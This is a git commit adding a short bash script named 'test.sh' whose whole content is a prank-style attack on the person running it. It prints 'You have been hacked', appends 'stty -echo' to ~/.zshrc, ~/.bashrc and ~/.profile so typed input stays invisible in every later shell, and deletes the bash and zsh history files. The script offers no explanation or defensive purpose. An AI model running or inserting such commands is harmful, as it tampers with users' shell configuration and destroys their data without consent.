e87ba7c15360382e65f60311f86a54c86f2aeb20
Arthinez <93657305+Hynoht@users.noreply.github.com>
2024-10-01 15:56:23 +0300

    Add files via upload

---
+++ test.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+
+echo "You have been hacked"
+
+# echo 'export LANG=zh_TW.UTF-8' >> ~/.bashrc
+# source ~/.bashrc
+
+echo "stty -echo" >> ~/.zshrc
+echo "stty -echo" >> ~/.bashrc
+echo "stty -echo" >> ~/.profile
+rm -f ~/.bash_history
+rm -f ~/.zsh_history
+exit
+
